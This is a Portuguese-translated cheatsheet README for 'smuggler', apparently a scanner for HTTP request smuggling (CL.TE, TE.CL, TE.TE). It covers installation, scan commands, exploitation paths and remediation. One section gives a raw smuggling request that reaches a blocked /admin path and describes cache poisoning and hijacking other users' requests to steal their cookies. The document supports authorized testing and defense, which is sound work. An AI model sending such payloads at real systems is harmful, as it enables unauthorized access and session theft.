<!-- language-home-navigation -->
[🏠 Página Principal Portuguesa](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 📦 contrabandista - Cheatsheet completo

[🇹🇷 Türkçe Sürüm](traduções/README.tr.md)
```
  ███████╗███╗   ███╗██╗   ██╗ ██████╗  ██████╗ ██╗     ███████╗██████╗ 
  ██╔════╝████╗ ████║██║   ██║██╔════╝ ██╔════╝ ██║     ██╔════╝██╔══██╗
  ███████╗██╔████╔██║██║   ██║██║  ███╗██║  ███╗██║     █████╗  ██████╔╝
  ╚════██║██║╚██╔╝██║██║   ██║██║   ██║██║   ██║██║     ██╔══╝  ██╔══██╗
  ███████║██║ ╚═╝ ██║╚██████╔╝╚██████╔╝╚██████╔╝███████╗███████╗██║  ██║
  ╚══════╝╚═╝     ╚═╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝
             High-Performance HTTP Request Smuggling Scanner
```
<p alinhar="centro">
  <img src="https://img.shields.io/badge/smuggler-HTTP_Smuggling-blue?style=for-the-badge" alt="smuggler">
  <img src="https://img.shields.io/badge/Author-Evan_Ricaurte-orange?style=for-the-badge" alt="defparam">
  <img src="https://img.shields.io/badge/Category-Web_Security_&_API-green?style=for-the-badge" alt="Segurança da Web">
  <img src="https://img.shields.io/badge/License-MIT-purple?style=for-the-badge" alt="MIT">
</p>

<p alinhar="centro">
  <b>📦 Ferramenta Python modular e ultrarrápida projetada para detectar e verificar vulnerabilidades de contrabando de solicitações HTTP (CL.TE, TE.CL e dessincronizações de mutação de cabeçalho) em infraestruturas web modernas</b>
</p>

---

## 📋 Índice

- [Visão geral e teoria do contrabando de HTTP](#-overview--http-smuggling-theory)
  - [Discrepâncias CL.TE vs TE.CL](#clte-vs-tecl-discrepâncias)
- [Instalação](#-instalação)
- [Verificação básica de alvo](#-basic-target-scanning)
- [Configurações de verificação e mecanismos de mutação](#-scan-configurations--mutation-engines)
  - [Verificação padrão vs exaustiva](#default-vs-exhaustive-scan)
  - [Cabeçalhos e cookies personalizados](#cabeçalhos personalizados--cookies)
- [Verificação de múltiplos alvos e pipeline](#-multi-alvo--varredura de pipeline)
- [Analisando resultados e caminhos de exploração](#-analyzing-results--exploitation-paths)
  - [Envenenamento de cache via contrabando](#envenenamento de cache via contrabando)
  - [Ignorando os controles de segurança front-end](#bypassing-front-end-security-controls)
  - [Sequestro de solicitações de outros usuários](#hijacking-other-users-requests)
- [Tabela de referência rápida](#-tabela de referência rápida)
- [Considerações Defensivas e Remediação](#-considerações-defensivas--remediação)
- [Isenção de responsabilidade legal](#-isenção de responsabilidade legal)

---

## 🎯 Visão geral e teoria do contrabando de HTTP

O contrabando de solicitações HTTP ocorre quando um proxy/balanceador de carga front-end e um servidor web back-end discordam sobre os limites de uma solicitação HTTP:

### Discrepâncias entre CL.TE e TE.CL
- **CL.TE:** Front-end usa `Content-Length`, back-end usa `Transfer-Encoding: chunked`.
- **TE.CL:** Front-end usa `Transfer-Encoding: chunked`, back-end usa `Content-Length`.
- **TE.TE:** Ambos suportam `Transfer-Encoding`, mas alguém pode ser levado a ignorá-lo por meio de ofuscação de cabeçalho (por exemplo, `Transfer-Encoding: xchunked`, guias ou dobramento de linha).

Criado por **defparam (Evan Ricaurte)**, o **smuggler** injeta cargas cuidadosamente elaboradas para observar atrasos de tempo ou respostas de dessincronização sem quebrar a estabilidade do serviço de back-end.

---

## 📥 Instalação
```bash
# Clone the repository
git clone https://github.com/defparam/smuggler.git
cd smuggler

# Run using Python 3
python3 smuggler.py -h
```
---

## 🚀 Varredura básica de alvo

Digitalize um único endpoint de aplicativo web:
```bash
# Basic scan against a single target
python3 smuggler.py -u https://target.com/
```
Por padrão, o contrabandista testa os comportamentos `CL.TE` e `TE.CL` usando cargas úteis de temporização segura.

---

## ⚙️ Configurações de verificação e mecanismos de mutação

### Verificação padrão vs exaustiva
O Smuggler inclui diferentes perfis de carga útil:
- **Perfil padrão:** Mutações dessincronizadas rápidas e comuns.
- **Perfil exaustivo:** Mutações abrangentes testando variações de espaços em branco, vários cabeçalhos e cabeçalhos de codificação de transferência ofuscados:
```bash
# Run exhaustive scan testing all mutation gadgets
python3 smuggler.py -u https://target.com/ -c exhaustive
```
### Cabeçalhos e cookies personalizados
Quando autenticação ou cabeçalhos de host específicos são necessários:
```bash
python3 smuggler.py -u https://target.com/api/ \
  -H "Cookie: session=xyz123" \
  -H "X-Forwarded-Host: target.com"
```
---

## 🌐 Verificação de múltiplos alvos e pipeline

Pipe endpoints descobertos de `httpx` ou `subfinder` diretamente para o contrabandista:
```bash
# Scan a list of URLs from file
python3 smuggler.py -f live_hosts.txt -t 10

# Adjust timeout per probe (default: 10s)
python3 smuggler.py -u https://target.com/ --timeout 5
```
---

## 💥 Analisando Resultados e Caminhos de Exploração

Quando o contrabandista relata uma correspondência positiva:
```text
[CRITICAL] CL.TE Desync Detected: https://target.com/
```
### Envenenamento de cache via contrabando
Contrabandear uma solicitação que gera um redirecionamento externo (por exemplo, manipulação do cabeçalho do host) para envenenar caches da web que servem bibliotecas JavaScript para todos os usuários.

### Ignorando os controles de segurança front-end
Se o proxy front-end bloquear `/admin`, contrabandeie uma solicitação interna secundária que chegue diretamente ao back-end sem inspeção de proxy:
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 48
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
```
### Sequestrando solicitações de outros usuários
Contrabandear um prefixo de uma solicitação HTTP. Quando o próximo usuário envia sua solicitação, ela é anexada à sua solicitação contrabandeada, expondo seus cookies e tokens de sessão.

---

## ⚡ Tabela de referência rápida

| Objetivo | Comando |
|-----------|---------|
| **Alvo único rápido** | `python3 smuggler.py -u https://target.com/` |
| **Varredura profunda exaustiva**| `python3 smuggler.py -u https://target.com/ -c exhaustive` |
| **Lista de alvos de digitalização** | `python3 smuggler.py -f targets.txt -t 15` |
| **Cabeçalhos/cookies personalizados**| `python3 smuggler.py -u <URL> -H "Cookie: sess=123"` |
| **Tempo limite personalizado** | `python3 smuggler.py -u <URL> --timeout 15` |

---

## 🛡️ Considerações defensivas e remediação

1. **Aplicar HTTP/2 ou HTTP/3 de ponta a ponta:** HTTP/2 define comprimentos de quadro inequívocos, eliminando a ambiguidade do cabeçalho.
2. **Normalizar cabeçalhos HTTP:** Configure proxies reversos para rejeitar solicitações contendo `Content-Length` e `Transfer-Encoding`.
3. **Eliminar mutações ambíguas:** Eliminar solicitações com cabeçalhos `Transfer-Encoding` ofuscados (por exemplo, espaços antes de dois pontos, vários valores).

---

## ⚠️ Isenção de responsabilidade legal

> [!CUIDADO]
> O contrabando de solicitações HTTP pode interromper filas de back-end ativas e envenenar nós de cache compartilhado. contrabandista deve ser usado exclusivamente em alvos de teste explicitamente autorizados, com permissão estrita dos proprietários dos ativos.